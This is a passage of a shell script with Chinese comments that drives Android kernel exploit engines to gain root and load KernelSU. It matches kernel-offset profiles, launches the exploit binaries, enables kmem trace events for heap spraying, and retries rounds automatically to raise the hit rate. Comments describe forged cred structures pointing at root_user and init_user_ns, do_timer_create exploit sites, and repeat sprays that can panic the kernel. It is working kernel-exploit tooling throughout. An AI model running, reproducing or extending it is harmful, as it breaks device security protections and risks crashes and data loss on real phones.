  [ -x "$TRFAST" ] || { echo "ENGINE_FAIL reason=missing-payload-kmfast ($TRFAST)"; return 12; }
  # ★ 这里**不再**用硬编码内核白名单（老版本只放行 g9bc34d5b0c79 / gc4127a25dcf3 两个串）。
  # 那个白名单会把「有精确档案、但内核串不在名单里」的机器全部拦死 —— 实测 PLQ110 升级到
  # 6.6.118-android15-8-g93e223c276e7-abogki500782043-4k 后就是这样：prof_12.txt 明明
  # 精确匹配这台机，却在走到 pick_profile 之前就被 FAST_GATE 挡掉，界面永远「重启再点」。
  # 真正的安全条件本来就是"有没有 release= 精确匹配的内置档案"（档案给的就是这台机的偏移），
  # 所以下面只保留这一道判据。
  if fast_alive; then
    echo "ENGINE_HOLD: kmfast 仍在运行（上一次的进程未退），本轮只接管日志"
  else
    # 与 参考引擎 的 matchedProfile() 同款：按 release= 精确匹配内置档案，
    # 匹配到就把它喂给引擎（KMENGINE_PROFILE），匹配不到才用引擎内置表
    PROF=$(pick_profile)
    if [ -z "$PROF" ]; then
      # 没有 release= 精确匹配的档案时，绝不能用"引擎内置表"跑：内置表是别的机型的偏移，
      # 在自家内核上就是野写。安全做法是不跑快速，让用户切 98260 慢链（慢链有 syms 兜底）。
      echo "FAST_GATE: 没有匹配 $SR 的内置档案 → 不跑快速（档案目录 $D，共 $(ls "$D"/prof_*.txt 2>/dev/null | wc -l | tr -d ' ') 份）"
      GATE_UNSUPPORTED=1
      return 1
    fi
    echo "FAST_PROFILE=$PROF ($(sed -n 's/^release=//p' "$PROF" | head -n 1 | tr -d '\r'))"
    echo "FAST_BUDGET=${FAST_BUDGET}s"
    [ -n "$ND" ] && mkdir -p /sdcard/km70 2>/dev/null
  echo "ENGINE_START engine=kmfast bin=$TRFAST mode=fake ksud=${KSUD:-none} pkg=$MGR"
    tlog ENGINE
    rm -f kmfast.log
    (
      [ -n "$PROF" ] && export KMENGINE_PROFILE="$PROF"
      if [ -f /sdcard/kmroot-nosel ]; then
        export KMENGINE_NOSEL=1
        echo "FAST_NOSEL: 跳过 selinux 阶段（/sdcard/kmroot-nosel）"
      fi
      [ -n "$ND" ] && export TMPDIR="$D"
      export KMENGINE_KSUD="$KSUD" KMENGINE_KSU_PKG="$MGR"
      setsid sh -c "exec "$TRFAST" fake > kmfast.log 2>&1 < /dev/null" &
    )
  fi

  # 轮询 0.3s：原来 1s 一轮，最坏要白等 1 秒才看到 KSU_LOADED
  i=0
  n=0
  while [ $i -lt $(iter_for "$FAST_BUDGET") ]; do
    sleep 0.3
    i=$((i+1))
    n=$((n+1))
    if [ $((n % 10)) -eq 0 ]; then tail -n 2 kmfast.log 2>/dev/null | sed 's/^/  | /'; fi
    if grep -q "KSU_LOADED" kmfast.log 2>/dev/null; then engine_digest kmfast.log; echo "KSU_LOADED"; tlog ROOT; return 0; fi
    if grep -qm1 -E "KSU_MISSING|fake cred page held|parking without reap" kmfast.log 2>/dev/null; then
      # 只要日志证明"页已经被持有"，就必须先落 held 标记 —— 不管 KSU 有没有起来。
      # 以前 KSU_MISSING 分支直接 return 3、不写标记，用户再点一次就是同一开机二次喷洒
      # （下面这条分支的注释自己写着要避免的就是这个）。
      if grep -qE "fake cred page held|parking without reap" kmfast.log 2>/dev/null; then
        set_held
      fi
      if grep -q "KSU_MISSING" kmfast.log 2>/dev/null; then
        echo "KSU_MISSING"
        PARTIAL=1
        echo "FAST_PARTIAL: 已拿到临时 root（root shell 跑完了），但管理器 late-load 没成 → 不再回退，避免同一开机二次喷洒"
        return 3
      fi
      echo "ENGINE_LOG_FULL:"
      tail -n 30 kmfast.log 2>/dev/null | sed 's/^/  | /'
      if grep -q "fake cred page held" kmfast.log 2>/dev/null; then
        echo "FAST_HELD: fake cred 页已持有 → 本次开机别再跑，重启后再试"
      else
        echo "FAST_PARKED: 本轮 miss，进程持页，别 kill"
      fi
      return 2
    fi
    fast_alive || { sleep 1; break; }
  done
  echo "ENGINE_LOG_TAIL:"
  engine_digest kmfast.log
  tail -n 25 kmfast.log 2>/dev/null | sed 's/^/  | /'
  if have_mod; then echo "KSU_LOADED"; return 0; fi
  if grep -qE "zombies are held|parking without reap|fake cred page held" kmfast.log 2>/dev/null; then
    echo "ENGINE_LOG_FULL:"
    tail -n 30 kmfast.log 2>/dev/null | sed 's/^/  | /'
    set_held
    echo "FAST_HELD: 引擎留下持页进程，本次开机不要再跑，重启后再试"
    return 2
  fi
  echo "ENGINE_FAIL reason=no-ksu"
  return 1
}

# ---------------------------------------------------------------- 模式 A2：6.1 快速（TimerRoot fast_61 引擎）
# 为什么接 TimerRoot 的 fast_61：
#   ① KMRoot 原版根本没有 6.1 的快速路线（KBASE 只认 6.6 / 6.12+，6.1.x 落到 unknown）；
#   ② fast_61 与 fast_gx62 是同一个二进制，靠**环境变量**接收配置，且**引擎自己开 kmem 事件**
#      （内部有 enable_event:kmem:* / page_ids），不依赖脚本 prep_trace —— 对 ROM 收走
#      enable 读权限的机器更鲁棒；
#   ③ 它吃 TIMEROOT_PROFILE（HOCON/key=value），字段与 KMRoot 的 prof_*.txt 完全一致，直接复用。
#
# 提高成功率的关键（参考 TimerRoot 战绩：单轮 ~11%，成功那次仅 8.9s）：
#   单次 miss 不持页 → 同 boot **安全地整轮重跑**，成功率随轮数叠加。
#   什么时候必须停（不能重跑）：日志出现 `fake cred page held` / `parking without reap`
#   —— 那时引擎已把页写进去、进程持页，同一 boot 再跑就是二次喷洒（可能 panic）。

# 单轮执行：起一个 fast_61 并轮询到结论。返回：
#   0=成功  2=持页(不可重跑)  3=拿到临时root但没装KSU  1=干净失败(可重跑)
_fast61_once() {
  local _t61="$1" _prof="$2" _budget="${3:-240}"
  rm -f kmfast61.log
  (
    export TIMEROOT_PROFILE="$_prof"
    export TIMEROOT_KSUD="$KSUD"
    export TIMEROOT_KSU_PKG="$MGR"
    [ -f /sdcard/kmroot-nosel ] && export TIMEROOT_NOSEL=1
    [ -n "$ND" ] && export TMPDIR="$D"
    setsid sh -c "exec $_t61 fake > kmfast61.log 2>&1 < /dev/null" &
  )
  i=0; n=0
  while [ $i -lt $(iter_for "$_budget") ]; do
    sleep 0.3
    i=$((i+1)); n=$((n+1))
    if [ $((n % 10)) -eq 0 ]; then tail -n 2 kmfast61.log 2>/dev/null | sed 's/^/  | /'; fi
    if grep -q "KSU_LOADED" kmfast61.log 2>/dev/null; then engine_digest kmfast61.log; echo "KSU_LOADED"; return 0; fi
    if grep -qm1 -E "KSU_MISSING|fake cred page held|parking without reap" kmfast61.log 2>/dev/null; then
      if grep -qE "fake cred page held|parking without reap" kmfast61.log 2>/dev/null; then
        set_held
        echo "ENGINE_LOG_FULL:"; tail -n 30 kmfast61.log 2>/dev/null | sed 's/^/  | /'
        echo "FAST61_HELD: 已持页，同 boot 不能再跑"
        return 2
      fi
      if grep -q "KSU_MISSING" kmfast61.log 2>/dev/null; then
        echo "KSU_MISSING"; PARTIAL=1
        echo "FAST61_PARTIAL: 已拿到临时 root，但管理器 late-load 没成"
        return 3
      fi
    fi
    pidof kmfast61 >/dev/null 2>&1 || pidof libkmfast61.so >/dev/null 2>&1 || { sleep 1; break; }
  done
  engine_digest kmfast61.log
  tail -n 25 kmfast61.log 2>/dev/null | sed 's/^/  | /'
  if have_mod; then echo "KSU_LOADED"; return 0; fi
  if grep -qE "zombies are held|parking without reap|fake cred page held" kmfast61.log 2>/dev/null; then
    set_held
    echo "FAST61_HELD: 引擎留下持页进程，本次开机不要再跑"
    return 2
  fi
  echo "FAST61_MISS: 本轮干净 miss（未持页），可重跑"
  return 1
}

run_fast61() {
  T61=$(bpath kmfast61 kmfast61)
  [ -n "$ND" ] || chmod 755 kmfast61 2>/dev/null
  [ -x "$T61" ] || { echo "ENGINE_FAIL reason=missing-payload-kmfast61 ($T61)"; return 12; }
  if pidof kmfast61 >/dev/null 2>&1 || pidof libkmfast61.so >/dev/null 2>&1; then
    echo "ENGINE_HOLD: kmfast61 仍在运行（上一次的进程未退），本轮只接管日志"
    return 2
  fi
  PROF=$(pick_profile)
  if [ -z "$PROF" ]; then
    echo "FAST61_GATE: 没有匹配 $SR 的 6.1 档案 → 不跑 6.1 引擎（档案目录 $D）"
    GATE_UNSUPPORTED=1
    return 1
  fi
  echo "FAST61_PROFILE=$PROF ($(sed -n 's/^release=//p' "$PROF" | head -n 1 | tr -d '\r'))"
  # 缺字段 = 引擎按默认值跑 = 校准必然失败，但日志只会显示 count=0，很难看出根因。
  # 这里先把缺的字段点出来（fast_61 实际读的是这 11 个）。
  _miss=""
  for _k in timer_link selinux_link user_ns root_user groups ucounts \
            task_cred kitimer_node kitimer_alloc task_alloc page_offset; do
    grep -q "^$_k=" "$PROF" 2>/dev/null || _miss="$_miss $_k"
  done
  [ -n "$_miss" ] && echo "FAST61_PROFILE_WARN: 档案缺字段:$_miss（建议补齐，否则校准会失败）"
  echo "ENGINE_START engine=kmfast61 bin=$T61 ksud=${KSUD:-none} pkg=$MGR"

  _rounds=${KMROOT_61_ROUNDS:-4}
  _r=0
  while [ $_r -lt $_rounds ]; do
    _r=$((_r+1))
    # ★ 第 2 轮起：**先重新把 kmem 事件打开**（对齐 6.6 路径的做法）。
    #   上一轮结束时 tracing_on / enable 可能已被引擎或 ROM 改回 0，不重开就没样本，
    #   下一轮必然又 miss —— 这是 6.1 多轮重跑之前最容易被忽略的一环。
    if [ $_r -gt 1 ]; then
      echo "FAST61_TRACE_REARM: 重新开 kmem 事件后再跑第 $_r 轮"
      prep_trace >/dev/null 2>&1
      echo "FAST61_TRACE_STATE: enabled=$_on/3 blocked=${TRACE_BLOCKED:-0}"
      # 上一轮已经明确「没有样本」且脚本这边也开不起来 → 再跑纯属浪费，直接收
      if [ "$TRACE_BLOCKED" = "1" ] && grep -q "page event ids not found" kmfast61.log 2>/dev/null; then
        echo "FAST61_ABORT: trace 通道彻底打不开（enabled=$_on/3）且上一轮已报 page event ids not found → 停止重试"
        echo "提示：本机 ROM 只允许 root 访问 kmem 事件；换哪条快速引擎都不会有样本"
        return 1
      fi
    fi
    # 第一轮给足预算；后续轮次引擎通常几十秒内就出结论，缩短避免长时间空转
    # ★ 0.9.2：240s → 120s。实测成功那次整轮 8 秒（plant 12ms 命中）；
    #   miss 的也会很快 park，240s 只是让用户干等。要放宽：KMROOT_61_BUDGET=240
    _budget=${KMROOT_61_BUDGET:-120}
    [ $_r -gt 1 ] && _budget=100
    echo "FAST61_ROUND: $_r/$_rounds (budget=${_budget}s)"
    _fast61_once "$T61" "$PROF" "$_budget"
    _rc=$?
    case "$_rc" in
      0) return 0 ;;                        # 成功
      2) return 2 ;;                        # 持页，立刻停（不能重跑）
      3) return 3 ;;                        # 已 root 但没装 KSU，也不再喷
      *) ;;                                 # 干净 miss → 下一轮
    esac
    # 重跑前确认进程已退、没有残留持页标记（双保险）
    if pidof kmfast61 >/dev/null 2>&1 || pidof libkmfast61.so >/dev/null 2>&1; then
      echo "FAST61_STOP: 引擎进程未退，停止重试（避免同 boot 并行喷洒）"
      return 2
    fi
  done
  echo "FAST61_EXHAUSTED: $_rounds 轮都没中（均未持页），可冷重启后再试，或切慢速 98260"
  return 1
}


# ---------------------------------------------------------------- 模式 B0：6.12.69（Shark runner，双 OTA 构建）
# Shark v2.1 的 libk61269 由 C 源码编译（exploit/src/K61269_plant.c + plant_core.inc，GPL-3.0），
# 内部按 uname 自动选两套调用点：
#   ab15865446 → do_timer_create 站点 0xffffffc0803718f4（low21 0x1718f4）
#   ab16372235 → do_timer_create+0x94 站点 0xffffffc08035783c（low21 0x15783c）
# 我们的 km612 系引擎只编了一套，所以在第二个 OTA 构建上会 base 校准失败。
# 开关：/sdcard/kmroot-612shark 存在时优先用它。
run_612s() {
  T612S=$(bpath km612s km612s)
  [ -n "$ND" ] || chmod 755 km612s 2>/dev/null
  [ -x "$T612S" ] || { echo "ENGINE_FAIL reason=missing-payload-km612s ($T612S)"; return 12; }
  echo "ENGINE_START engine=km612s（Shark v2.1 runner · 双 OTA 按 uname 选站点）ksud=${KSUD:-none} pkg=$MGR"
  rm -f km612s.log
  (
    export PYB110_KSUD="$KSUD"
    export PYB110_MANAGER_PKG="$MGR"
    export PYB110_KMI="android16-6.12"
    [ -n "$ND" ] && export TMPDIR="$D"
    setsid sh -c "exec $T612S fake > km612s.log 2>&1 < /dev/null" &
  )
  i=0; n=0
  while [ $i -lt $(iter_for "${KMROOT_612S_BUDGET:-200}") ]; do
    sleep 0.3; i=$((i+1)); n=$((n+1))
    if [ $((n % 10)) -eq 0 ]; then tail -n 2 km612s.log 2>/dev/null | sed 's/^/  | /'; fi
    if grep -qm1 "PROFILE_61269" km612s.log 2>/dev/null; then
      echo "SHARK_PROFILE: $(grep -m1 'PROFILE_61269' km612s.log | tr -d '\r')"
    fi
    if have_mod; then echo "KSU_LOADED"; return 0; fi
    if grep -qm1 "LATE_LOAD_RC\|LATE_LOAD_SHELL_RC" km612s.log 2>/dev/null; then break; fi
    pidof km612s >/dev/null 2>&1 || { sleep 1; break; }
  done
  tail -n 20 km612s.log 2>/dev/null | sed 's/^/  | /'
  if have_mod; then echo "KSU_LOADED"; return 0; fi
  if grep -qE "parking without reap|zombies held|fake cred page held" km612s.log 2>/dev/null; then
    set_held
    echo "SHARK_HELD: 已持页，本 boot 不要再跑，冷重启后再试"
    return 2
  fi
  echo "ENGINE_FAIL reason=km612s-no-ksu"
  return 1
}

# ---------------------------------------------------------------- 模式 B：6.12 快速
E612_BUDGET=${KMROOT_612_BUDGET:-150}

# ---------------------------------------------------------------- 模式 B2：6.12 新版引擎（参考引擎 1.91，A/B）
# 与旧链的差别（2026-11-03 拆 参考引擎_1.91 得出）：
#   ① 单个二进制（442KB，md5 de5651e2…，不再需要 2.1MB 的 km612su）；
#   ② late-load 由它自己的 fake-cred 子进程执行 —— 我们只需给环境变量
#      KM612N_KSUD / KM612N_MANAGER_PKG / KM612N_KMI（它内部跑
#      "ksud late-load --kmi … --allow-shell --package-name …"）；
#   ③ 失败时把 zombie 交给 holder 进程并退出（日志 FAIL_EXIT=… holder=km6120-hold），
#      按它的手册「失败后不必重启，同一 boot 可直接再点」→ 这条路径**不写 held 标记**。
# 开关：/sdcard/kmroot-new612（存在即启用）；默认仍走旧链，便于 A/B。
# ★ 0.8.78：能不能在引擎跑的期间把 trace 通道一直维持着？
#   0.8.77 的实测：plant 阶段报 `victim not captured (recs=0)`，而 base/cred 两层都正常 ——
#   引擎的模式是“先排空缓冲、开 tracing、喷、关 tracing、再读”，只要中间任一步没生效
#   （比如事件被关、tracing_on 被其他人关掉），读出来就是 0 字节。
#   这里用一个后台循环每 0.3s 把 tracing_on 写 1 + 重打 rss_stat/trigger（夹具体事件也试一下），
#   用 /sdcard/kmroot-no-traceka 可关闭。它不改任何内核内存，只动 tracefs 开关。

# ★ 0.8.80：不再猜“事件开没开”，直接采样 `trace` 的行数。
#   plant 失败是因为引擎读到 0 字节；那么就要区分两种情况：
#     ① 这段时间条 record 在增长（说明事件是开的，那就是引擎读错了 per-cpu buffer）
#     ② 行数一直不动（说明事件真的没开 / 没产生记录）
trace_probe_start() {
  [ -f /sdcard/kmroot-no-traceka ] && return 0
  rm -f "$D/trace_sample.txt" 2>/dev/null
  # 一次 grep 读完全部 CPU 的 entries（比逐个 sed 快一个数量级），
  # 1000 轮 × 20ms ≈ 20s，足够覆盖整个引擎运行期。
  # 每行 8 个数字，顺序固定为 cpu0..cpu7。
  cat > "$D/_probe.sh" <<'PROBEEOF'
i=0
while [ $i -lt 1000 ]; do
  { grep -h '^entries:' /sys/kernel/tracing/per_cpu/cpu*/stats 2>/dev/null | awk '{printf "%s ", $2}'
    echo "t=$(cat /sys/kernel/tracing/tracing_on 2>/dev/null)"
  } >> "$1"
  i=$((i+1))
  sleep 0.02
done
PROBEEOF
  sh "$D/_probe.sh" "$D/trace_sample.txt" >/dev/null 2>&1 &
  echo "TRACE_PROBE: started out=$D/trace_sample.txt（cpu0..cpu7 的 entries）"
}

trace_probe_summary() {
  if [ ! -f "$D/trace_sample.txt" ]; then
    echo "TRACE_SAMPLE: NOFILE（采样文件未生成 → 探针没跑起来）"
    return 0
  fi
  _n=$(wc -l < "$D/trace_sample.txt" 2>/dev/null)
  echo "TRACE_SAMPLE: samples=${_n:-0}（每行 8 个数字 = cpu0..cpu7 的 entries）"
  echo "TRACE_SAMPLE_FIRST: $(head -n 1 "$D/trace_sample.txt" 2>/dev/null)"
  echo "TRACE_SAMPLE_LAST:  $(tail -n 1 "$D/trace_sample.txt" 2>/dev/null)"
  # 峰值：引擎读完会把 buffer 抽干，末值看不出中途有没有尖峰，峰值才靠谱
  echo "TRACE_SAMPLE_MAX:   $(awk '{for(i=1;i<=NF;i++) if($i+0>m[i]+0) m[i]=$i+0} END{for(i=1;i<=8;i++) printf "%d:%d ", i-1, m[i]+0; print ""}' "$D/trace_sample.txt" 2>/dev/null)"
  echo "TRACE_SAMPLE_MIN:   $(awk 'NR==1{for(i=1;i<=NF;i++) m[i]=$i+0; next} {for(i=1;i<=NF;i++) if($i+0<m[i]+0) m[i]=$i+0} END{for(i=1;i<=8;i++) printf "%d:%d ", i-1, m[i]+0; print ""}' "$D/trace_sample.txt" 2>/dev/null)"
  echo "TRACE_ON_OFF:       $(grep -c 't=0' "$D/trace_sample.txt" 2>/dev/null) 个采样点 tracing_on=0（>0 说明 reset 后没恢复）"
  rm -f "$D/trace_sample.txt" 2>/dev/null
}

trace_keepalive_start() {
  # ★ 0.8.81：保活默认关闭。
  #   理由：trace_reset(0x6a97c) 的流程是 tracing_on=0 → 清空 → 抽干 → tracing_on=1，
  #   整个窗口只有几十毫秒；保活每 50ms 强写一次 tracing_on=1，正好撞进这个窗口，
  #   会让"抽干"变成边抽边产，把子进程刚喷出来的记录一起吃掉 → plant 读到 0 字节。
  #   0.8.78/0.8.79 加保活后 plant 反而一直 recs=0，与本判断一致。
  #   需要时 touch /sdcard/kmroot-ka 可重新开启。
  # 一次性把 tracing_on 拉回 1（脚本对此文件有写权限，日志里 write=ok），不做高频循环
  echo 1 > /sys/kernel/tracing/tracing_on 2>/dev/null
  [ -f /sdcard/kmroot-ka ] || { echo "TRACE_KA_OFF: 保活默认关闭（touch /sdcard/kmroot-ka 可开启）"; return 0; }
  [ -w /sys/kernel/tracing/tracing_on ] || { echo "TRACE_KA_SKIP: tracing_on 不可写"; return 0; }
  # 0.8.79 把节奏收到 0.05s，但实测 plant 仍 recs=0；这里保持原节奏，可用 /sdcard/kmroot-no-traceka 关闭
  cat > "$D/_ka.sh" <<'KAEOF'
i=0
while [ $i -lt 400 ]; do
  echo 1 > /sys/kernel/tracing/tracing_on 2>/dev/null
  for ev in mm_page_alloc mm_page_free kmem_cache_alloc; do
    echo "enable_event:kmem:$ev" > /sys/kernel/tracing/events/kmem/rss_stat/trigger 2>/dev/null
    echo 1 > "/sys/kernel/tracing/events/kmem/$ev/enable" 2>/dev/null
  done
  i=$((i+1))
  sleep 0.05
done
KAEOF
  sh "$D/_ka.sh" >/dev/null 2>&1 &
  echo "TRACE_KA: 已后台维持 tracing_on=1 + kmem 事件（每 0.05s，最多 20s，/sdcard/kmroot-no-traceka 可关）"
}

run_612n() {
  echo "ENGINE_START engine=km612n（参考引擎 1.91 新版 · 自做 late-load）"
  trace_keepalive_start
  trace_probe_start
  [ -n "$KSUD" ] || { echo "ENGINE_FAIL reason=no-ksud（新版引擎要求先装管理器）"; return 12; }
  [ -x "$T61269N" ] || { echo "ENGINE_FAIL reason=missing-payload-km612n ($T61269N)"; return 12; }
  if pidof libkm612n.so >/dev/null 2>&1 || pidof km612n >/dev/null 2>&1; then
    echo "ENGINE_HOLD: 上一次的 km612n 还在跑"
    return 2
  fi
  rm -f km612n.log
  (
    export KM612N_KSUD="$KSUD"; export KM612N_MANAGER_PKG="$MGR"; export KM612N_KMI="${KMI:-android16-6.12}"
    [ -n "$ND" ] && export TMPDIR="$D"
    setsid sh -c "exec $KMPIN \"$T61269N\" fake > km612n.log 2>&1 < /dev/null" &
  )
  i=0
  while [ $i -lt $(iter_for "$E612_BUDGET") ]; do
    sleep 0.3
    i=$((i+1))
    if grep -qm1 "LATE_LOAD_RC=" km612n.log 2>/dev/null; then break; fi
    if grep -qm1 "FAIL_EXIT=" km612n.log 2>/dev/null; then break; fi
    if grep -qm1 "FAIL=probe" km612n.log 2>/dev/null; then break; fi
    ( pidof libkm612n.so >/dev/null 2>&1 || pidof km612n >/dev/null 2>&1 ) || { sleep 1; break; }
  done
  tlog ENGINE
  engine_digest km612n.log
  tail -n 25 km612n.log 2>/dev/null | sed 's/^/  | /'
  if have_mod; then
    rm -f "$ENG_HINT" "$ENG_BAD" 2>/dev/null
    echo "KSU_LOADED（新版引擎已自己 late-load）"
    tlog ROOT
    return 0
  fi
  # ★ 0.8.52：新版 6.12 引擎的 preflight 自带 trace 通道检查（`REASON=trace channel unavailable`），
  #   撞上时直接归到 TRACEBLOCK（而不是笼统的 FASTFAIL）—— 结论对用户更有用。
  if grep -q "trace channel unavailable" km612n.log 2>/dev/null; then
    echo "TRACE_BLOCKED: 新版引擎 preflight 判 trace 通道不可用（本机 shell 开不了 kmem 事件）"
    TRACEBLOCK=1
    return 1
  fi
  if grep -q "REASON=kernel mismatch" km612n.log 2>/dev/null; then
    echo "KERNEL_MISMATCH: 新版 6.12 引擎判本机内核不在支持列表（preflight 阶段、未喷洒 → 可安全回落老引擎）"
    N612_MISMATCH=1
    return 1
  fi
  # ★ 0.8.67：PMW110 现场 —— 引擎过了版本/通道检查、kmem 事件也开起来了（[ids] page_alloc=334），
  #   却卡在 `[base] made=512 best=0 count=0` → `base calibration failed`。
  #   这是「本 build 的 trace 记录/指针布局与引擎假设不一致」，必须单独定性，
  #   否则只会落到笼统的 `km612n-no-module`，把人和后续适配都带偏。
  if grep -q "base calibration failed" km612n.log 2>/dev/null; then
    echo "ENGINE_BASECAL_FAIL: base 校准失败（[base] best=0 count=0）—— 本 build 布局与引擎假设不一致，不是脚本问题"
    # ★ 0.8.68：不用用户手建任何文件 —— 记下 release + 本次 BOOTID，
    #   下次冷重启（BOOTID 变了）自动改试老引擎。
    printf '%s|%s\n' "$SR" "${BOOTID:-unknown}" > "$ENG_HINT" 2>/dev/null \
      && echo "ENGINE_OLDNEXT_ARMED: 已记下（冷重启后自动改试老引擎，无需手动建文件）"
    N612_BASECAL=1
    return 1
  fi
  if grep -q "holder=km6120-hold" km612n.log 2>/dev/null; then
    echo "FAST_RETRYABLE: 新版引擎已把 zombie 交给 holder（holder=km6120-hold）→ 同一 boot 可以直接再点，不必重启"
    return 1
  fi
  echo "ENGINE_FAIL reason=km612n-no-module"
  return 1
}

# ★ 0.9.7：自动重试包装。单次 plant 命中率只有 ~50%（每轮日志都是某个 stage 的
#   `burst hit=0` / `holding zombie`），以前靠用户反复点。引擎自己对
#   `FAIL_EXIT=… holder=km6120-hold` 的定性就是「同一 boot 可以直接再点，不必重启」，
#   所以在同一个 boot 内自动连跑最多 $EXP_RETRY_MAX 次（默认 3，KMROOT_EXP_RETRY 可改），中间不重启。
#   只在「引擎正常退出、但没拿到模块」（rc=1 且没置 _EXP_NO_RETRY）时重试；
#   collect-only / 已持页 / 通道或版本不匹配 / base 校准失败 这些确定性失败一律不重试。
run_612x() {
  EXP_RETRY_MAX=${KMROOT_EXP_RETRY:-3}
  case "$EXP_RETRY_MAX" in ''|*[!0-9]*) EXP_RETRY_MAX=3 ;; esac
  _try=0
  while :; do
    _try=$((_try+1))
    [ "$_try" -gt 1 ] && echo "ENGINE_ATTEMPT: km612x 同 boot 第 ${_try}/${EXP_RETRY_MAX} 次（上一轮 plant 未中，zombie 已交 holder）"
    _run612x_once
    _rc=$?
    case "$_rc" in
      0) return 0 ;;
      1)
        [ "${_EXP_NO_RETRY:-0}" = "1" ] && return 1
        if [ "$_try" -lt "$EXP_RETRY_MAX" ]; then
          echo "ENGINE_RETRY: 第 ${_try} 次没拿到模块 → 不重启，直接再来一次（还剩 $((EXP_RETRY_MAX-_try)) 次）"
          mv -f km612x.log "km612x.a${_try}.log" 2>/dev/null
          sleep 1
          continue
        fi
        echo "ENGINE_RETRY_EXHAUSTED: 同 boot 已连试 ${_try} 次都没中 —— 这是命中率问题（不是崩溃）；冷重启后再点命中率更高"
        return 1 ;;
      *) return "$_rc" ;;
    esac
  done
}

_run612x_once() {
  _EXP_NO_RETRY=0
  _cut=0
  _parked=0
  echo "ENGINE_START engine=km612x（参考引擎 1.91 新版 · 自做 late-load）"
  # ★ 0.9.5：伪造 cred 模板里的 user/user_ns 增量已按本机符号表重算 ——
  #   旧版按 P=0x3718F4 算的常量在本内核上让 cred->user_ns 落到 .data（socket_mt_reg 附近），
  #   cap_capable 读到 level=0 → 所有 capable() 返回 -EPERM → init_module 装不上模块。
  #   现在 user=&root_user、user_ns=&init_user_ns（都是 base+符号偏移，绝对地址）。
  echo "EXP_CREDNS: 伪造 cred 已指向 root_user + init_user_ns（0.9.5 修 user_ns 野指针）"
  # ★ 0.9.6：ucounts / group_info 也补上。0.9.5 实测在 ksud fork 时崩在
  #   prepare_creds+0x118 = get_group_info(NULL)（ldadd 对 [x0] 原子加），
  #   因为 prepare_creds 里 get_group_info/get_uid/get_ucounts 全是**无条件**解引用。
  #   现在恢复 0x69510 那条 stur q0，并把 .rodata@0x49c0 换成 init_ucounts/init_groups 的增量。
  echo "EXP_CREDUC: cred->ucounts/group_info 指向 init_ucounts/init_groups（0.9.6）"
  # ★ 0.9.13：验尸闸门 —— pstore 里有上一轮内核日志、上一轮引擎日志已被取走（km612x.log 不在了）、
  #   且这份 pstore 还没验过（/sdcard/.kmroot_crash_seen 一次性标记）→ 本轮只验尸、不跑引擎。
  #   （0.8.99 只回灌"带 panic 关键词"的栈；0.9.13 改**无条件验尸** —— watchdog/强杀类崩溃
  #   没有 panic 关键词，20:13 那次就是被 PSTORE_SKIP 漏掉、只靠 LAST_RUN_ABORT 兜底。
  #   WARNING: CPU 不进 hits 计数，仍是 MTK 开机噪音。）
  _pst=""
  for _ps in /sys/fs/pstore/console-ramoops-0 /sys/fs/pstore/console-ramoops; do
    [ -r "$_ps" ] || continue
    [ -s "$_ps" ] || continue
    _pst="$_ps"; break
  done
  if [ -n "$_pst" ] && [ ! -f km612x.log ] && [ ! -f /sdcard/.kmroot_crash_seen ]; then
    echo "AUTOPSY: pstore 有未取证的内核日志（$_pst，$(wc -c < "$_pst" 2>/dev/null)B）→ 本轮只验尸、不跑引擎"
    autopsy_dump "$_pst"
    echo "COLLECT_ONLY: 验尸完成，导出日志发我（全文已另存 /sdcard/kmroot-pstore-last.txt 可拷出）；再点一次正常开跑"
    _EXP_NO_RETRY=1
    return 1
  fi
  # ★ 0.8.95：先抢救上一轮的引擎日志 —— 必须放在所有 return 之前（ENGINE_HOLD 也会早退）。
  #   引擎 stdout 是文件，bionic 全缓冲（4KB），进程被打死时最后一段常常还没落盘；
  #   但只要它后来正常退出就会 flush，所以残留文件往往比当轮日志更完整。
  #   0.8.94 那一轮就是"脚本先死、引擎后走"，现场全在残留文件里。
  if [ -f km612x.log ] && [ -s km612x.log ]; then
    cp -f km612x.log km612x.prev.log 2>/dev/null
    echo "ENGINE_PREV_LOG: $(wc -c < km612x.log 2>/dev/null)B（上一轮残留，整段回灌）"
    sed 's/^/  # /' km612x.log 2>/dev/null | tail -n 80
    # ★ 0.8.98：日志里没有正常终止符 = 上一轮被腰斩（panic 最常见）。
    #   这比 run.flag 可靠 —— flag 是"建了但没写"，panic 时可能连目录项都没落盘。
    if ! grep -qE 'FAIL_EXIT=|LATE_LOAD_RC=|LATE_LOAD_SHELL_RC=|KSU_LOADED|RESULT=' km612x.log 2>/dev/null; then
      _cut=1
    fi
  fi
  # ★ 0.8.98：pstore 必须在 collect-only 的 return **之前**读 ——
  #   0.8.97 那轮就是吃了这个亏：提前 return，把上一轮的内核栈整段漏掉了。
  #   只在"上一轮没正常收尾"时读，免得每轮都刷 60 行噪音。
  if [ -f "$D/run.flag" ] || [ -f /sdcard/kmroot-collect ] || [ "${_cut:-0}" = "1" ]; then
    for _ps in /sys/fs/pstore/console-ramoops-0 /sys/fs/pstore/console-ramoops; do
      [ -r "$_ps" ] || continue
      echo "PSTORE: $_ps $(wc -c < "$_ps" 2>/dev/null)B（上一轮内核日志尾部）"
      tail -n 60 "$_ps" 2>/dev/null | sed 's/^/  ! /'
      break
    done
  fi
  # ★ 0.8.95：崩溃哨兵。引擎启动前落标记，正常收尾才删。
  #   下次开机还看到它 → 上一轮是内核 panic / 进程被强杀，不是脚本或操作问题。
  # ★ 0.8.96：看到标记就**只回灌、不跑引擎**。panic 会把 App 一起带走，
  #   这一轮要是又崩，刚回灌出来的日志照样导不出来 —— 先让人把日志导出，再点一次才真跑。
  # ★ 0.8.98：`/sdcard/kmroot-collect` 是手动开关 —— 想在"不崩"的前提下取现场就用它。
  if [ -f "$D/run.flag" ] || [ -f /sdcard/kmroot-collect ] || [ "${_cut:-0}" = "1" ]; then
    echo "LAST_RUN_ABORT: 上一轮引擎启动后没有正常收尾（内核 panic 或进程被强杀）——不是脚本问题"
    rm -f "$D/run.flag" 2>/dev/null
    rm -f km612x.log 2>/dev/null
    # ★ 0.9.13：趁现在把证据一次拿全 —— pstore 全文落盘 + 阶梯代理进度 + bootreason（验尸）
    for _ps in /sys/fs/pstore/console-ramoops-0 /sys/fs/pstore/console-ramoops; do
      [ -r "$_ps" ] || continue
      [ -s "$_ps" ] || continue
      autopsy_dump "$_ps"
      break
    done
    echo "COLLECT_ONLY: 本轮只回灌现场、不跑引擎（避免再崩一次把日志弄丢）。导出日志后再点一次即可正常开跑"
    _EXP_NO_RETRY=1
    return 1
  fi
